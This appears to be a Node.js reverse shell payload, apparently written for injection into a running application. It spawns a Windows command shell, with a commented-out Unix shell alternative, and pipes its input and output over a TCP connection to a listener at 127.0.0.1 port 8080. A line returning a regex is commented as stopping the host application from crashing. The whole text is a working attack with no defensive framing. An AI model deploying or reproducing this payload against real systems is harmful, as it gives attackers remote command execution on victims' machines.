(function(){
    console.log(process.platform);
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", []);
        //sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();